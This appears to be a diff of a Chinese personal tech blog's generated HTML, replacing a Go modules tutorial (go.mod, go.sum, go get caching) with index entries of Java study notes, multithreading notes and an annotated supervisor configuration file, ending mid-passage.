-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">module github.com/eddycjy/module-repo</span><br><span class="line"><span class="comment"># 标识当前要模块的 go 语言版本，值为初始化时的版本，目前来看还只是个标识作用。</span></span><br><span class="line">go 1.13</span><br><span class="line"><span class="comment"># 用于设置一个特定的模块版本</span></span><br><span class="line">require (</span><br><span class="line">    example.com/apple v0.1.2</span><br><span class="line">    example.com/banana v1.2.3</span><br><span class="line">    example.com/banana/v2 v2.3.4</span><br><span class="line">    example.com/pear // indirect   <span class="comment"># indirect 表示该模块为间接模块（可能是你 go get，或者其他模块所依赖的）</span></span><br><span class="line">    example.com/strawberry // incompatible</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 用于从使用中排除一个特定的模块版本</span></span><br><span class="line">exclude example.com/banana v1.2.4</span><br><span class="line"><span class="comment"># 用于将一个模块版本替换为另外一个模块版本</span></span><br><span class="line">replace example.com/apple v0.1.2 =&gt; example.com/fried v0.1.0</span><br><span class="line">replace example.com/banana =&gt; example.com/fish</span><br></pre></td></tr></table></figure>
 
-<h3 id="查看-go-sum"><a href="#查看-go-sum" class="headerlink" title="查看 go.sum"></a>查看 go.sum</h3><p>在第一次拉取模块依赖后，会发现多出了一个 go.sum 文件，其详细罗列了当前项目直接/间接依赖的所有模块的版本，并写明了那些模块版本的 SHA-256 哈希值以备 go 在售后操作中保证项目所依赖的那些模块版本不会被篡改。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">github.com/eddycjy/mquote v0.0.1/go.mod h1:ZtlkDs7Mriynl7wsDQ4cU23okEtVYqHwl7F1eDh4qPg=</span><br><span class="line">github.com/eddycjy/mquote/module/tour v0.0.1 h1:cc+pgV0LnR8Fhou0zNHughT7IbSnLvfUZ+X3fvshrv8=</span><br><span class="line">github.com/eddycjy/mquote/module/tour v0.0.1/go.mod h1:8uL1FOiQJZ4/1hzqQ5mv4Sm7nJcwYu41F3nZmkiWx5I=</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><a href="">     </a><br>我们可以看到一个模块路径可能有如下两种</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">github.com/eddycjy/mquote v0.0.1/go.mod h1:ZtlkDs7Mriynl7wsDQ4cU23okEtVYqHwl7F1eDh4qPg=</span><br></pre></td></tr></table></figure>
 
-<p><a href="">
-</a></p>
-<p>h1 hash 是 go modules 将目标模块版本的 zip 文件开包后，针对所有包内文件依次进行 hash，然后再把它们的 hash 结果按照固定格式和算法组成总的 hash 值。</p>
-<p>h1 hash 和 go.mod hash 两者，要不就是同时存在，要不就是只存在 go.mod hash。那么什么情况下不存在 h1 hash 呢？ 就是当 go 认为肯定用不到这个模块版本时就会省略它的 h1 hash，就会出现不存在 h1 hash，只存在 go.mod hash 情况。</p>
-<h3 id="查看全局缓存"><a href="#查看全局缓存" class="headerlink" title="查看全局缓存"></a>查看全局缓存</h3><p>我们刚刚成功的将  <code>github.com/eddycjy/mquote</code>   拉取了下来，其拉取的结果缓存在<br>GOPATH/pkg/sum 目录下，而在 mod 目录下会以 github.com/foo/bar 的格式进行存放</p>
-<p>├── cache<br>├── github.com<br>├── golang.org<br>├── google.golang.org<br>├── gopkg.in…<br><a href="">
-</a></p>
-<p>需要注意的是同一个模块版本的数据只缓存一份，所有其他模块共享使用。如果你希望清理所有已经缓存的模块，可以使用</p>
-<h2 id="go-modules-的-go-get-行为"><a href="#go-modules-的-go-get-行为" class="headerlink" title="go modules 的 go get 行为"></a>go modules 的 go get 行为</h2><p>在拉取项目依赖时，你会发现拉取的过程总共分了三大步，分别是</p>
-<ul>
-<li>finding 发现</li>
-<li>downloading 下载</li>
-<li>extracting 提取</li>
-</ul>
-<p>并且在拉取信息上一共分为了三段内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861221259-8884bc24-157e-47d5-9d98-e9a0b4bf3ad5.png#align=left&display=inline&height=430&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.26.55.png&originHeight=430&originWidth=1294&size=163681&status=done&style=none&width=1294" alt="截屏2021-01-17 下午1.26.55.png"></p>
-<p>pkg/mod 目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/go/pkg</span><br><span class="line">❯ ls</span><br><span class="line">mod   sumdb</span><br><span class="line"></span><br><span class="line">~/go/pkg</span><br><span class="line">❯ <span class="built_in">cd</span> mod</span><br><span class="line"></span><br><span class="line">go/pkg/mod</span><br><span class="line">❯ ls</span><br><span class="line">cache             github.com        golang.org        gopkg.in</span><br><span class="line">fyne.io           go.uber.org       google.golang.org moul.io</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  
+    <article id="post-yuque/java小抄0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%840/">java小抄0</a>
+    </h1>
+  
 
-<p>需要注意的是，所拉取版本的 commit 时间是以 UTC 时区为准，而并非本地时区，同时我们会发现我们 go get 命令所拉取到的版本是 <code>v.0.0.0</code> ，这是因为我们是直接执行 go get -u 获取的，并没有指定任何的版本信息，由 go modules 自行按内部规则进行选择。</p>
-<h3 id="go-get-行为"><a href="#go-get-行为" class="headerlink" title="go get 行为"></a>go get 行为</h3><p>刚刚我们用 go get   命令拉取了新的依赖，那么 go get 又提供了哪些功能有呢？ 常用的拉取命令</p>
-<p><strong>那么我们想选择具体版本应该如何执行呢</strong>？如下</p>
+        
+        <a href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%840/" class="archive-article-date">
+  	<time datetime="2022-01-01T13:26:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="String-StringBuffer-StringBuilder-区别"><a href="#String-StringBuffer-StringBuilder-区别" class="headerlink" title="String StringBuffer StringBuilder 区别"></a>String StringBuffer StringBuilder 区别</h3><p>String 是不可修改的（开发常用）因为不可更改，所以效率高<br>StringBuffer 是线程安全的有 synchronized 关键字（字符变化比较频繁，使用）<br>StringBuilder 不是线程安全的</p>
+<h3 id="Runtime-单例设计模式"><a href="#Runtime-单例设计模式" class="headerlink" title="Runtime 单例设计模式"></a>Runtime 单例设计模式</h3><p>具体查看文档，同 getRuntime<br>Runtime 是一个私有方法，每一个程序在运行时都会自动启动它，当程序内产生垃圾后，会调用 Runtime 中 gc 类，用来回收内存。（该方法是不定期调用的）</p>
+<h3 id="System-类"><a href="#System-类" class="headerlink" title="System 类"></a>System 类</h3><p>System 中有 gc 方法，从源码上看是调用 Runtime 的 gc 方法；<br>final ， finally ，finalize 却别<br>Final 是一个关键字，用于定义不能被继承的父类，和不能重写的方法<br>Finally 是一个异常处理的统一处出口。<br>Finalize 是一个 Object 调用 finalize 来做类似于 C++析构函数的作用。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%840/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/多线程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/01/yuque/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/01/yuque/%E5%A4%9A%E7%BA%BF%E7%A8%8B/" class="archive-article-date">
+  	<time datetime="2022-01-01T13:24:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="runnable-or-callable"><a href="#runnable-or-callable" class="headerlink" title="runnable_or_callable"></a>runnable_or_callable</h2><p>Runable 与 callable 是两个线程接口，这:两个线程方法都是通过 Thread 类来启动线程，只不过 runable 内只有一个 run 方法，而 callable 是有返回值的，返回值类型为 FutureTask。<br><a target="_blank" rel="noopener" href="https://github.com/zy84338719/java/tree/master/src/com/zhangyi/multithread/callable.java">demo 地址</a><br>Java 创建执行创建一个 JVM 进程，然后由 JVM 创建线程，主线程名称为 main。</p>
+<h3 id="记：JVM-是一个进程，所有的方法有主线程创建一个线程。"><a href="#记：JVM-是一个进程，所有的方法有主线程创建一个线程。" class="headerlink" title="记：JVM 是一个进程，所有的方法有主线程创建一个线程。"></a>记：JVM 是一个进程，所有的方法有主线程创建一个线程。</h3><h2 id="线程优先级设置后，线程执行顺序有可能被提高"><a href="#线程优先级设置后，线程执行顺序有可能被提高" class="headerlink" title="线程优先级设置后，线程执行顺序有可能被提高"></a>线程优先级设置后，线程执行顺序有可能被提高</h2><p>主方法 main 线程优先级为中等优先级。</p>
+<p>若有收获，就点个赞吧</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/01/yuque/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/守护进程配置指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/16/yuque/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/">守护进程配置指南</a>
+    </h1>
+  
+
+        
+        <a href="/2021/12/16/yuque/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/" class="archive-article-date">
+  	<time datetime="2021-12-16T13:56:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>supervisor 配置</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/tmp/supervisor.sock   ; socket文件的路径，supervisorctl用XML_RPC和supervisord通信就是通过它进行</span><br><span class="line">                              的。如果不设置的话，supervisorctl也就不能用了</span><br><span class="line">                              不设置的话，默认为none。 非必须设置</span><br><span class="line">;chmod=0700                 ; 这个简单，就是修改上面的那个socket文件的权限为0700</span><br><span class="line">                              不设置的话，默认为0700。 非必须设置</span><br><span class="line">;chown=nobody:nogroup       ; 这个一样，修改上面的那个socket文件的属组为user.group</span><br><span class="line">                              不设置的话，默认为启动supervisord进程的用户及属组。非必须设置</span><br><span class="line">;username=user              ; 使用supervisorctl连接的时候，认证的用户</span><br><span class="line">                               不设置的话，默认为不需要用户。 非必须设置</span><br><span class="line">;password=123               ; 和上面的用户名对应的密码，可以直接使用明码，也可以使用SHA加密</span><br><span class="line">                              如：&#123;SHA&#125;82ab876d1387bfafe46cc1c8a2ef074eae50cb1d</span><br><span class="line">                              默认不设置。。。非必须设置</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ; 侦听在TCP上的socket，Web Server和远程的supervisorctl都要用到他</span><br><span class="line">                              不设置的话，默认为不开启。非必须设置</span><br><span class="line">;port=127.0.0.1:9001        ; 这个是侦听的IP和端口，侦听所有IP用 :9001或*:9001。</span><br><span class="line">                              这个必须设置，只要上面的[inet_http_server]开启了，就必须设置它</span><br><span class="line">;username=user              ; 这个和上面的uinx_http_server一个样。非必须设置</span><br><span class="line">;password=123               ; 这个也一个样。非必须设置</span><br><span class="line"></span><br><span class="line">[supervisord]                ;这个主要是定义supervisord这个服务端进程的一些参数的</span><br><span class="line">                              这个必须设置，不设置，supervisor就不用干活了</span><br><span class="line">logfile=/tmp/supervisord.log ; 这个是supervisord这个主进程的日志路径，注意和子进程的日志不搭嘎。</span><br><span class="line">                               默认路径$CWD/supervisord.log，$CWD是当前目录。。非必须设置</span><br><span class="line">logfile_maxbytes=50MB        ; 这个是上面那个日志文件的最大的大小，当超过50M的时候，会生成一个新的日</span><br><span class="line">                               志文件。当设置为0时，表示不限制文件大小</span><br><span class="line">                               默认值是50M，非必须设置。</span><br><span class="line">logfile_backups=10           ; 日志文件保持的数量，上面的日志文件大于50M时，就会生成一个新文件。文件</span><br><span class="line">                               数量大于10时，最初的老文件被新文件覆盖，文件数量将保持为10</span><br><span class="line">                               当设置为0时，表示不限制文件的数量。</span><br><span class="line">                               默认情况下为10。。。非必须设置</span><br><span class="line">loglevel=info                ; 日志级别，有critical, error, warn, info, debug, trace, or blather等</span><br><span class="line">                               默认为info。。。非必须设置项</span><br><span class="line">pidfile=/tmp/supervisord.pid ; supervisord的pid文件路径。</span><br><span class="line">                               默认为$CWD/supervisord.pid。。。非必须设置</span><br><span class="line">nodaemon=false               ; 如果是true，supervisord进程将在前台运行</span><br><span class="line">                               默认为false，也就是后台以守护进程运行。。。非必须设置</span><br><span class="line">minfds=1024                  ; 这个是最少系统空闲的文件描述符，低于这个值supervisor将不会启动。</span><br><span class="line">                               系统的文件描述符在这里设置cat /proc/sys/fs/file-max</span><br><span class="line">                               默认情况下为1024。。。非必须设置</span><br><span class="line">minprocs=200                 ; 最小可用的进程描述符，低于这个值supervisor也将不会正常启动。</span><br><span class="line">                              ulimit  -u这个命令，可以查看linux下面用户的最大进程数</span><br><span class="line">                              默认为200。。。非必须设置</span><br><span class="line">;umask=022                   ; 进程创建文件的掩码</span><br><span class="line">                               默认为022。。非必须设置项</span><br><span class="line">;user=chrism                 ; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。</span><br><span class="line">                               我这里面设置的这个用户，也可以对supervisord进行管理</span><br><span class="line">                               默认情况是不设置。。。非必须设置项</span><br><span class="line">;identifier=supervisor       ; 这个参数是supervisord的标识符，主要是给XML_RPC用的。当你有多个</span><br><span class="line">                               supervisor的时候，而且想调用XML_RPC统一管理，就需要为每个</span><br><span class="line">                               supervisor设置不同的标识符了</span><br><span class="line">                               默认是supervisord。。。非必需设置</span><br><span class="line">;directory=/tmp              ; 这个参数是当supervisord作为守护进程运行的时候，设置这个参数的话，启动</span><br><span class="line">                               supervisord进程之前，会先切换到这个目录</span><br><span class="line">                               默认不设置。。。非必须设置</span><br><span class="line">;nocleanup=true              ; 这个参数当为false的时候，会在supervisord进程启动的时候，把以前子进程</span><br><span class="line">                               产生的日志文件(路径为AUTO的情况下)清除掉。有时候咱们想要看历史日志，当</span><br><span class="line">                               然不想日志被清除了。所以可以设置为true</span><br><span class="line">                               默认是false，有调试需求的同学可以设置为true。。。非必须设置</span><br><span class="line">;childlogdir=/tmp            ; 当子进程日志路径为AUTO的时候，子进程日志文件的存放路径。</span><br><span class="line">                               默认路径是这个东西，执行下面的这个命令看看就OK了，处理的东西就默认路径</span><br><span class="line">                               python -c &quot;import tempfile;print tempfile.gettempdir()&quot;</span><br><span class="line">                               非必须设置</span><br><span class="line">;environment=KEY=&quot;value&quot;     ; 这个是用来设置环境变量的，supervisord在linux中启动默认继承了linux的</span><br><span class="line">                               环境变量，在这里可以设置supervisord进程特有的其他环境变量。</span><br><span class="line">                               supervisord启动子进程时，子进程会拷贝父进程的内存空间内容。 所以设置的</span><br><span class="line">                               这些环境变量也会被子进程继承。</span><br><span class="line">                               小例子：environment=name=&quot;haha&quot;,age=&quot;hehe&quot;</span><br><span class="line">                               默认为不设置。。。非必须设置</span><br><span class="line">;strip_ansi=false            ; 这个选项如果设置为true，会清除子进程日志中的所有ANSI 序列。什么是ANSI</span><br><span class="line">                               序列呢？就是我们的\n,\t这些东西。</span><br><span class="line">                               默认为false。。。非必须设置</span><br><span class="line"></span><br><span class="line">; the below section must remain in the config file for RPC</span><br><span class="line">; (supervisorctl/web interface) to work, additional interfaces may be</span><br><span class="line">; added by defining them in separate rpcinterface: sections</span><br><span class="line">[rpcinterface:supervisor]    ;这个选项是给XML_RPC用的，当然你如果想使用supervisord或者web server 这</span><br><span class="line">                              个选项必须要开启的</span><br><span class="line">supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"></span><br><span class="line">[supervisorctl]              ;这个主要是针对supervisorctl的一些配置</span><br><span class="line">serverurl=unix:///tmp/supervisor.sock ; 这个是supervisorctl本地连接supervisord的时候，本地UNIX socket</span><br><span class="line">                                        路径，注意这个是和前面的[unix_http_server]对应的</span><br><span class="line">                                        默认值就是unix:///tmp/supervisor.sock。。非必须设置</span><br><span class="line">;serverurl=http://127.0.0.1:9001 ; 这个是supervisorctl远程连接supervisord的时候，用到的TCP socket路径</span><br><span class="line">                                   注意这个和前面的[inet_http_server]对应</span><br><span class="line">                                   默认就是http://127.0.0.1:9001。。。非必须项</span><br><span class="line"></span><br><span class="line">;username=chris              ; 用户名</span><br><span class="line">                               默认空。。非必须设置</span><br><span class="line">;password=123                ; 密码</span><br><span class="line">                              默认空。。非必须设置</span><br><span class="line">;prompt=mysupervisor         ; 输入用户名密码时候的提示符</span><br><span class="line">                               默认supervisor。。非必须设置</span><br><span class="line">;history_file=~/.sc_history  ; 这个参数和shell中的history类似，我们可以用上下键来查找前面执行过的命令</span><br><span class="line">                               默认是no file的。。所以我们想要有这种功能，必须指定一个文件。。。非</span><br><span class="line">                               必须设置</span><br><span class="line"></span><br><span class="line">; The below sample program section shows all possible program subsection values,</span><br><span class="line">; create one or more &#x27;real&#x27; program: sections to be able to control them under</span><br><span class="line">; supervisor.</span><br><span class="line"></span><br><span class="line">;[program:theprogramname]      ;这个就是咱们要管理的子进程了，&quot;:&quot;后面的是名字，最好别乱写和实际进程</span><br><span class="line">                                有点关联最好。这样的program我们可以设置一个或多个，一个program就是</span><br><span class="line">                                要被管理的一个进程</span><br><span class="line">;command=/bin/cat              ; 这个就是我们的要启动进程的命令路径了，可以带参数</span><br><span class="line">                                例子：/home/test.py -a &#x27;hehe&#x27;</span><br><span class="line">                                有一点需要注意的是，我们的command只能是那种在终端运行的进程，不能是</span><br><span class="line">                                守护进程。这个想想也知道了，比如说command=service httpd start。</span><br><span class="line">                                httpd这个进程被linux的service管理了，我们的supervisor再去启动这个命令</span><br><span class="line">                                这已经不是严格意义的子进程了。</span><br><span class="line">                                这个是个必须设置的项</span><br><span class="line">;process_name=%(program_name)s ; 这个是进程名，如果我们下面的numprocs参数为1的话，就不用管这个参数</span><br><span class="line">                                 了，它默认值%(program_name)s也就是上面的那个program冒号后面的名字，</span><br><span class="line">                                 但是如果numprocs为多个的话，那就不能这么干了。想想也知道，不可能每个</span><br><span class="line">                                 进程都用同一个进程名吧。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;numprocs=1                    ; 启动进程的数目。当不为1时，就是进程池的概念，注意process_name的设置</span><br><span class="line">                                 默认为1    。。非必须设置</span><br><span class="line">;directory=/tmp                ; 进程运行前，会前切换到这个目录</span><br><span class="line">                                 默认不设置。。。非必须设置</span><br><span class="line">;umask=022                     ; 进程掩码，默认none，非必须</span><br><span class="line">;priority=999                  ; 子进程启动关闭优先级，优先级低的，最先启动，关闭的时候最后关闭</span><br><span class="line">                                 默认值为999 。。非必须设置</span><br><span class="line">;autostart=true                ; 如果是true的话，子进程将在supervisord启动后被自动启动</span><br><span class="line">                                 默认就是true   。。非必须设置</span><br><span class="line">;autorestart=unexpected        ; 这个是设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected</span><br><span class="line">                                 和true。如果为false的时候，无论什么情况下，都不会被重新启动，</span><br><span class="line">                                 如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的退</span><br><span class="line">                                 出码的时候，才会被自动重启。当为true的时候，只要子进程挂掉，将会被无</span><br><span class="line">                                 条件的重启</span><br><span class="line">;startsecs=1                   ; 这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启</span><br><span class="line">                                 动成功了</span><br><span class="line">                                 默认值为1 。。非必须设置</span><br><span class="line">;startretries=3                ; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把</span><br><span class="line">                                 此进程的状态置为FAIL</span><br><span class="line">                                 默认值为3 。。非必须设置</span><br><span class="line">;exitcodes=0,2                 ; 注意和上面的的autorestart=unexpected对应。。exitcodes里面的定义的</span><br><span class="line">                                 退出码是expected的。</span><br><span class="line">;stopsignal=QUIT               ; 进程停止信号，可以为TERM, HUP, INT, QUIT, KILL, USR1, or USR2等信号</span><br><span class="line">                                  默认为TERM 。。当用设定的信号去干掉进程，退出码会被认为是expected</span><br><span class="line">                                  非必须设置</span><br><span class="line">;stopwaitsecs=10               ; 这个是当我们向子进程发送stopsignal信号后，到系统返回信息</span><br><span class="line">                                 给supervisord，所等待的最大时间。 超过这个时间，supervisord会向该</span><br><span class="line">                                 子进程发送一个强制kill的信号。</span><br><span class="line">                                 默认为10秒。。非必须设置</span><br><span class="line">;stopasgroup=false             ; 这个东西主要用于，supervisord管理的子进程，这个子进程本身还有</span><br><span class="line">                                 子进程。那么我们如果仅仅干掉supervisord的子进程的话，子进程的子进程</span><br><span class="line">                                 有可能会变成孤儿进程。所以咱们可以设置可个选项，把整个该子进程的</span><br><span class="line">                                 整个进程组都干掉。 设置为true的话，一般killasgroup也会被设置为true。</span><br><span class="line">                                 需要注意的是，该选项发送的是stop信号</span><br><span class="line">                                 默认为false。。非必须设置。。</span><br><span class="line">;killasgroup=false             ; 这个和上面的stopasgroup类似，不过发送的是kill信号</span><br><span class="line">;user=chrism                   ; 如果supervisord是root启动，我们在这里设置这个非root用户，可以用来</span><br><span class="line">                                 管理该program</span><br><span class="line">                                 默认不设置。。。非必须设置项</span><br><span class="line">;redirect_stderr=true          ; 如果为true，则stderr的日志会被写入stdout日志文件中</span><br><span class="line">                                 默认为false，非必须设置</span><br><span class="line">;stdout_logfile=/a/path        ; 子进程的stdout的日志路径，可以指定路径，AUTO，none等三个选项。</span><br><span class="line">                                 设置为none的话，将没有日志产生。设置为AUTO的话，将随机找一个地方</span><br><span class="line">                                 生成日志文件，而且当supervisord重新启动的时候，以前的日志文件会被</span><br><span class="line">                                 清空。当 redirect_stderr=true的时候，sterr也会写进这个日志文件</span><br><span 